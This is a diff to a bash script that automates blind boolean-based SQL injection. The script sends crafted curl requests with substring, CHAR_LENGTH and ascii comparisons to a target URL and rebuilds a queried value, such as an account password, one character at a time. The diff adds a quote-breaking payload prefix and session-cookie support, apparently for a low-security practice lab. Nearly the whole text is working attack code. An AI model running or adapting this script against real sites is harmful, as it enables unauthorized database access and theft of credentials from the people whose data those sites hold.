@@ -14,6 +14,7 @@ length=""
 commando="$2"
 url=$1
 string=$3
+sessionCookie='PHPSESSID=n2csm9glugacbkadlrtikpgr16; security=low' # PUT YOUR SESSION COOKIE HERE IF NEEDED
 
 if [[ -z $url || -z $commando || -z $string ]];then
   echo -e "\n$yellowColour[!] Usage: $0 'http://vulnerable.site/sqli.php?id=1234' 'SELECT password FROM awd.accounts LIMIT 1' 'String which appears when TRUE condition'"
@@ -43,7 +44,11 @@ function getChar(){
     charHex="$(printf '%x' $c)"
     char="$(echo $charHex | xxd -ps -r)"
     #echo -e "$blueColour[*] Testing if $commando[$1] = '$char'$endColour"
-    res=$(curl -sik "$url%20or%20(SELECT%20substring((${commando// /%20}),$1,1))=%27%$charHex%27;%20--%20-" | grep -o "$string")
+    if [[ ! -z "$sessionCookie" ]];then
+      res=$(curl -sik "$url%27%20or%20(SELECT%20substring((${commando// /%20}),$1,1))=%27%$charHex%27;%20--%20-" -b "$sessionCookie" | grep -o "$string")
+    else
+      res=$(curl -sik "$url%27%20or%20(SELECT%20substring((${commando// /%20}),$1,1))=%27%$charHex%27;%20--%20-" | grep -o "$string")
+    fi
     if [[ ! -z "$res" ]];then
       #echo -e "$greenColour[+] $commando[$1] = $char$endColour"
       echo "$1 $char" >> $(pwd)/blindsqli.txt
@@ -57,17 +62,29 @@ echo -e "\n$blueColour[*] Getting length... "
 
 for l in {1..255}; do
     #echo -e "$blueColour[*] Testing if $commando has $l characters...$endColour"
-    res=$(curl -sik "$url%20or%20(SELECT%20CHAR_LENGTH((${commando// /%20})))=%27$l%27;%20--%20-" | grep -o "$string")
+    if [[ ! -z "$sessionCookie" ]];then
+     res=$(curl -sik "$url%27%20or%20(SELECT%20CHAR_LENGTH((${commando// /%20})))=%27$l%27;%20--%20-" -b "$sessionCookie" | grep -o "$string")
+    else
+     res=$(curl -sik "$url%27%20or%20(SELECT%20CHAR_LENGTH((${commando// /%20})))=%27$l%27;%20--%20-" | grep -o "$string")
+    fi
     if [[ ! -z "$res" ]];then length="$l"; break; fi
 done
+
+if [[ -z $length ]];then echo -e "\n$redColour[x] Unable to perform the exfiltration! $endColour"; exit 1; fi
+
 echo -e "\n$greenColour[+] String's lenght is: $endColour$length"
 
 echo -e "\n$blueColour[*] Getting characters..."
 echo -e "$blueColour[*] Don't worry if seems hanged, I'm working on it, you can go for a coffee :)"
 
 for i in $(seq 1 $length); do
-  resL=$(curl -sik "$url%20or%20(SELECT%20ascii(lower(substring((${commando// /%20}),$i,1))))=(SELECT%20ascii(substring((${commando// /%20}),$i,1)));%20--%20-" | grep -o "$string")
-  resU=$(curl -sik "$url%20or%20(SELECT%20ascii(upper(substring((${commando// /%20}),$i,1))))=(SELECT%20ascii(substring((${commando// /%20}),$i,1)));%20--%20-" | grep -o "$string")
+  if [[ ! -z "$sessionCookie" ]];then
+    resL=$(curl -sik "$url%27%20or%20(SELECT%20ascii(lower(substring((${commando// /%20}),$i,1))))=(SELECT%20ascii(substring((${commando// /%20}),$i,1)));%20--%20-" -b "$sessionCookie" | grep -o "$string")
+    resU=$(curl -sik "$url%27%20or%20(SELECT%20ascii(upper(substring((${commando// /%20}),$i,1))))=(SELECT%20ascii(substring((${commando// /%20}),$i,1)));%20--%20-" -b "$sessionCookie" | grep -o "$string")
+  else
+    resL=$(curl -sik "$url%27%20or%20(SELECT%20ascii(lower(substring((${commando// /%20}),$i,1))))=(SELECT%20ascii(substring((${commando// /%20}),$i,1)));%20--%20-" | grep -o "$string")
+    resU=$(curl -sik "$url%27%20or%20(SELECT%20ascii(upper(substring((${commando// /%20}),$i,1))))=(SELECT%20ascii(substring((${commando// /%20}),$i,1)));%20--%20-" | grep -o "$string")
+  fi
   if [[ ! -z "$resL" && -z $resU ]];then
     getChar "$i" "l" &
     continue
@@ -87,5 +104,5 @@ done
 
 wait
 exfiltrate=$(sort -g $(pwd)/blindsqli.txt | awk '{print $2}' | xargs | sed 's/ //g')
-rm $(pwd)/blindsqli.txt
+rm $(pwd)/blindsqli.txt &>/dev/null
 echo -e "\n$greenColour[+] Here's your exifiltrated string: $endColour$exfiltrate"
